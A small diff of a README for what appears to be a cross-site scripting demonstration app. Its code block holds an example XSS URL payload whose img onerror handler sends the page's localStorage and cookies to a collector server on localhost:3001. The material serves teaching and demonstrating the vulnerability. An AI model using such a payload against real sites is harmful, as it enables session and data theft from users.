@@ -17,8 +17,9 @@ In the project directory client, you can run:
 
 Open [http://localhost:3000](http://localhost:3000) to view it in the browser.
 
+Example attack:
 ```
-Example attack: http://localhost:3000/?text=<img src onerror="fetch(`http://localhost:3001?localStorage=${JSON.stringify(localStorage)}&cookie=${JSON.stringify(document.cookie)}`).then(data => data.json()).then(data => console.log('server response', data))" />
+http://localhost:3000/?text=<img src onerror="fetch(`http://localhost:3001?localStorage=${JSON.stringify(localStorage)}&cookie=${JSON.stringify(document.cookie)}`).then(data => data.json()).then(data => console.log('server response', data))" />
 ```
 
 Check console for the response from server
